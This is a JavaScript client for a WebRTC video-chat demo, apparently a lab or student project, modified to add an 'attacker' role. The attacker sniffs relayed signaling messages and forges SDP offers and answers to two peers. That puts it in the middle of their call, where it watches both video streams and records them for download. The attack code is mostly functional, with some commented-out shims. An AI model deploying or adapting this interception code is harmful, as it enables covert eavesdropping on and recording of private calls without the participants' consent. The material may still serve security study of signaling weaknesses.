'use strict';

var isChannelReady = false;
var isInitiator = false;
var isStarted = false;
var isAttacker = false;//delineates attacker
var localStream = null;
var pc, pcA, pcB;
var remoteStream = null;
var turnReady;
var fakeoffer = false;
var fakeanswer = false;
var isStartedA = false;
var isStartedB = false;
var UserA_SDP, UserB_SDP;
var tellA_toCall = false;

var BremoteStream;

var pcConfig = {
  'iceServers': [{
    'urls': 'stun:stun.l.google.com:19302'
  }]
};

// Set up audio and video regardless of what devices are present.
var sdpConstraints = {
  offerToReceiveAudio: true,
  offerToReceiveVideo: true
};

/////////////////////////////////////////////

//var room = 'foo';
// Could prompt for room name:
var myRoom = prompt('Enter room name:');

var socket = io.connect();

if (myRoom !== '') {
  socket.emit('create or join', myRoom);
  console.log('Attempted to create or  join room', myRoom);
}

socket.on('created', function(room) {
  console.log('Created room ' + room);
  myRoom = room;
  isInitiator = true;
});

socket.on('full', function(room) {
  console.log('Room ' + room + ' is full');
});

socket.on('join', function (room){
  console.log('Another peer made a request to join room ' + room);
  console.log('This peer is the initiator of room ' + room + '!');
  myRoom = room;
  isChannelReady = true;
});

socket.on('joined', function(room) {
  console.log('joined: ' + room);
  myRoom = room;
  isChannelReady = true;
});

socket.on('log', function(array) {
  console.log.apply(console, array);
});

//test function to have attacker forward messages
socket.on('sniff', function(message, room){
    console.log("sniffed mssage:" + message)
    if (tellA_toCall === false)
    {
      ForwardA_Message("got user media")
    }

  if (isAttacker && !fakeoffer && message.type === "offer"){ // if this is attack and fake offer hasn't been created
    UserA_SDP = message;
    pcA.setRemoteDescription(new RTCSessionDescription(message)); //Remote description of User A
  //createTwoConnection(pcB)
  fakeoffer = true;
}
else if(isAttacker && !fakeanswer && message.type === "answer"){
  //createTwoConnection(pcA)
  pcB.setRemoteDescription(new RTCSessionDescription(message)); //REmote description of User B
  fakeanswer = true;
}
  if (message.type === 'candidate' && isStarted) {
    var candidate = new RTCIceCandidate({
      sdpMLineIndex: message.label,
      candidate: message.candidate
    });
    if (room === "bad1"){
    pcA.addIceCandidate(candidate);
  }
  else if (room === "bad2")
  {
   pcB.addIceCandidate(candidate); 
  }
}
  //socket.emit('forward', message, room);

});

//Sets local attacker varaiable
socket.on('set attacker', function(){
  isAttacker = true;
  document.getElementById("header").innerHTML = "You are the attacker!";
  createTwoConnection("pcB");
  createTwoConnection("pcA");
});

////////////////////////////////////////////////

function sendMessage(message) {
  console.log('Client sending message: ', message, myRoom);
  socket.emit('message', message, myRoom);
}

function ForwardA_Message(message){
  socket.emit('forward_ToA', message);
}
function ForwardB_Message(message){
  socket.emit('forward_ToB', message);
}

// This client receives a message
socket.on('message', function(message) {
  console.log('Client received message:', message);
  if (message === 'got user media') {
    maybeStart();
  } else if (message.type === 'offer') {
    if (!isInitiator && !isStarted) {
      maybeStart();
    }
    pc.setRemoteDescription(new RTCSessionDescription(message));
    doAnswer();
  } else if (message.type === 'answer' && isStarted) {
    pc.setRemoteDescription(new RTCSessionDescription(message));
  } else if (message.type === 'candidate' && isStarted) {
    var candidate = new RTCIceCandidate({
      sdpMLineIndex: message.label,
      candidate: message.candidate
    });
    pc.addIceCandidate(candidate);
  } else if (message === 'bye' && isStarted) {
    handleRemoteHangup();
  }
});

////////////////////////////////////////////////////

var localVideo = document.querySelector('#localVideo'); //attacker's view of User A
var remoteVideo = document.querySelector('#remoteVideo'); //attacker's view of User B

navigator.mediaDevices.getUserMedia({
  audio: true,
  video: true
})
.then(gotStream)
.catch(function(e) {
  alert('getUserMedia() error: ' + e.name);
});

//Disabled local video for attacker
function gotStream(stream) {
  if(!isAttacker){
    console.log('Adding local stream.');
    localStream = stream;
    localVideo.srcObject = stream;
    sendMessage('got user media');

    //shim function for sending attacker a stream -- not functioning
    // clonedstream = stream.clone();
    // socket.emit('stream', clonedstream);
    // console.log('Uh oh, shared my stream...');
    
    if (isInitiator) {
      maybeStart();
    }
  }
}

var constraints = {
  video: true
};

console.log('Getting user media with constraints', constraints);

if (location.hostname !== 'localhost') {
  requestTurn(
    'https://computeengineondemand.appspot.com/turn?username=41784574&key=4080218913'
  );
}

function maybeStart() {
  console.log('>>>>>>> maybeStart() ', isStarted, localStream, isChannelReady);
  if (!isStarted && typeof localStream !== 'undefined' && isChannelReady) {
    console.log('>>>>>> creating peer connection');
    createPeerConnection();
    pc.addStream(localStream);

    var newStream = new MediaStream(localStream);
    socket.emit('stream', newStream);
    console.log('Uh oh, shared my stream...');

    isStarted = true;
    console.log('isInitiator', isInitiator);
    if (isInitiator) {
      doCall();
    }
  }
}

window.onbeforeunload = function() {
  sendMessage('bye');
};

/////////////////////////////////////////////////////////

function createTwoConnection(pcinput) {
  if (pcinput === "pcA"){
  try {
    pcA = new RTCPeerConnection(null);
    pcA.onicecandidate = ToA_handleIceCandidate;
    pcA.onaddstream = FromA_handleRemoteStreamAdded;
    pcA.onremovestream = handleRemoteStreamRemoved;
    console.log('Created RTCPeerConnnection');
  } catch (e) {
    console.log('Failed to create PeerConnection, exception: ' + e.message);
    alert('Cannot create RTCPeerConnection object.');
    return;
  }
}
else if (pcinput === "pcB")
{
  try {
    pcB = new RTCPeerConnection(null);
    pcB.onicecandidate = ToB_handleIceCandidate;
    pcB.onaddstream = FromB_handleRemoteStreamAdded;
    pcB.onremovestream = handleRemoteStreamRemoved;
    console.log('Created RTCPeerConnnection');
  } catch (e) {
    console.log('Failed to create PeerConnection, exception: ' + e.message);
    alert('Cannot create RTCPeerConnection object.');
    return;
  }
}
else
{
  console.log("nothing created")
}
}

function createPeerConnection() {
  try {
    pc = new RTCPeerConnection(null);
    pc.onicecandidate = handleIceCandidate;
    pc.onaddstream = handleRemoteStreamAdded;
    pc.onremovestream = handleRemoteStreamRemoved;
    console.log('Created RTCPeerConnnection');
  } catch (e) {
    console.log('Failed to create PeerConnection, exception: ' + e.message);
    alert('Cannot create RTCPeerConnection object.');
    return;
  }
}

function handleIceCandidate(event) {
  console.log('icecandidate event: ', event);
  if (event.candidate) {
    sendMessage({
      type: 'candidate',
      label: event.candidate.sdpMLineIndex,
      id: event.candidate.sdpMid,
      candidate: event.candidate.candidate
    });
  } else {
    console.log('End of candidates.');
  }
}
function ToA_handleIceCandidate(event) {
  console.log('icecandidate event: ', event);
  if (event.candidate) {
    ForwardA_Message({
      type: 'candidate',
      label: event.candidate.sdpMLineIndex,
      id: event.candidate.sdpMid,
      candidate: event.candidate.candidate
    });
  } else {
    console.log('End of candidates.');
  }
}
function ToB_handleIceCandidate(event) {
  console.log('icecandidate event: ', event);
  if (event.candidate) {
    ForwardB_Message({
      type: 'candidate',
      label: event.candidate.sdpMLineIndex,
      id: event.candidate.sdpMid,
      candidate: event.candidate.candidate
    });
  } else {
    console.log('End of candidates.');
  }
}

function handleCreateOfferError(event) {
  console.log('createOffer() error: ', event);
}

function doCall() {
  console.log('Sending offer to peer');
  pc.createOffer(setLocalAndSendMessage, handleCreateOfferError);
}

function doFakeCall(){
 pcB.createOffer(FakeB_setLocalAndSendMessage, handleCreateOfferError); 
}
function FakeB_setLocalAndSendMessage(sessionDescription) {
  pcB.setLocalDescription(sessionDescription);
  console.log('setLocalAndSendMessage sending message', sessionDescription);
  ForwardB_Message(sessionDescription);
  //attack have to user forward and to specific user
}
function FakeA_setLocalAndSendMessage(sessionDescription) {
  pcA.setLocalDescription(sessionDescription);
  console.log('setLocalAndSendMessage sending message', sessionDescription);
  ForwardA_Message(sessionDescription);
  //attack have to user forward and to specific user
}
function doFakeAnswer() {
  console.log('Sending answer to peer.');
  pcA.createAnswer().then(
    FakeA_setLocalAndSendMessage,
    onCreateSessionDescriptionError
  );
}


function doAnswer() {
  console.log('Sending answer to peer.');
  pc.createAnswer().then(
    setLocalAndSendMessage,
    onCreateSessionDescriptionError
  );
}

function setLocalAndSendMessage(sessionDescription) {
  pc.setLocalDescription(sessionDescription);
  console.log('setLocalAndSendMessage sending message', sessionDescription);
  sendMessage(sessionDescription);
  //attack have to user forward and to specific user
}



function onCreateSessionDescriptionError(error) {
  trace('Failed to create session description: ' + error.toString());
}

function requestTurn(turnURL) {
  var turnExists = false;
  for (var i in pcConfig.iceServers) {
    if (pcConfig.iceServers[i].urls.substr(0, 5) === 'turn:') {
      turnExists = true;
      turnReady = true;
      break;
    }
  }
  if (!turnExists) {
    console.log('Getting TURN server from ', turnURL);
    // No TURN server. Get one from computeengineondemand.appspot.com:
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status === 200) {
        var turnServer = JSON.parse(xhr.responseText);
        console.log('Got TURN server: ', turnServer);
        pcConfig.iceServers.push({
          'urls': 'turn:' + turnServer.username + '@' + turnServer.turn,
          'credential': turnServer.password
        });
        turnReady = true;
      }
    };
    xhr.open('GET', turnURL, true);
    xhr.send();
  }
}

function FromA_handleRemoteStreamAdded(event) { //Video coming from A
  console.log('Remote stream added from A.');
  localStream = event.stream;
  localVideo.srcObject = localStream;
  pcB.addStream(localStream)
  doFakeCall();
  
}

function FromB_handleRemoteStreamAdded(event) {
  console.log('Remote stream added from B.');
  BremoteStream = event.stream;
  remoteVideo.srcObject = BremoteStream;
  pcA.addStream(BremoteStream)
  doFakeAnswer();
  
}


function handleRemoteStreamAdded(event) {
  console.log('Remote stream added.');
  remoteStream = event.stream;
  remoteVideo.srcObject = remoteStream;
  
}

function handleRemoteStreamRemoved(event) {
  console.log('Remote stream removed. Event: ', event);
}

function hangup() {
  console.log('Hanging up.');
  stop();
  sendMessage('bye');
}

function handleRemoteHangup() {
  console.log('Session terminated.');
  stop();
  isInitiator = false;
}

function stop() {
  isStarted = false;
  pc.close();
  pc = null;
}




//shim functions for setting attacker streams
// NOT currently working

//gets stream from server
// socket.on('captured stream', function(stream){
//   cloneStream(stream);
// });

// //sets local streams in DOM
// function cloneStream(stream){
//   if (localStream !== 'undefined'){
//     localStream = stream;
//     localVideo.srcObject = localStream;
//   }else{
//     remoteStream = stream;
//     remoteVideo.srcObject = remoteStream;
//   }
// }

let mediaRecorder;
let recordedBlobs;

const recordedVideo = document.querySelector('video#recorded');
const recordButton = document.querySelector('button#record');
recordButton.addEventListener('click', () => {
  if (recordButton.textContent === 'Start Recording') {
    startRecording();
  } else {
    stopRecording();
    recordButton.textContent = 'Start Recording';
    //playButton.disabled = false;
    downloadButton.disabled = false;
  }
});


const downloadButton = document.querySelector('button#download');
downloadButton.addEventListener('click', () => {
  const blob = new Blob(recordedBlobs, {type: 'video/webm'});
  const url = window.URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.style.display = 'none';
  a.href = url;
  a.download = 'test.webm';
  document.body.appendChild(a);
  a.click();
  setTimeout(() => {
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
  }, 100);
});

function handleDataAvailable(event) {
  console.log('handleDataAvailable', event);
  if (event.data && event.data.size > 0) {
    recordedBlobs.push(event.data);
  }
}

function startRecording() {
  recordedBlobs = [];
  let options = {mimeType: 'video/webm;codecs=vp9,opus'};
  if (!MediaRecorder.isTypeSupported(options.mimeType)) {
    console.error(`${options.mimeType} is not supported`);
    options = {mimeType: 'video/webm;codecs=vp8,opus'};
    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
      console.error(`${options.mimeType} is not supported`);
      options = {mimeType: 'video/webm'};
      if (!MediaRecorder.isTypeSupported(options.mimeType)) {
        console.error(`${options.mimeType} is not supported`);
        options = {mimeType: ''};
      }
    }
  }

  try {
    mediaRecorder = new MediaRecorder(localStream, options);
  } catch (e) {
    console.error('Exception while creating MediaRecorder:', e);
    errorMsgElement.innerHTML = `Exception while creating MediaRecorder: ${JSON.stringify(e)}`;
    return;
  }

  console.log('Created MediaRecorder', mediaRecorder, 'with options', options);
  recordButton.textContent = 'Stop Recording';
  //playButton.disabled = true;
  downloadButton.disabled = true;
  mediaRecorder.onstop = (event) => {
    console.log('Recorder stopped: ', event);
    console.log('Recorded Blobs: ', recordedBlobs);
  };
  mediaRecorder.ondataavailable = handleDataAvailable;
  mediaRecorder.start();
  console.log('MediaRecorder started', mediaRecorder);
}

function stopRecording() {
  mediaRecorder.stop();
}
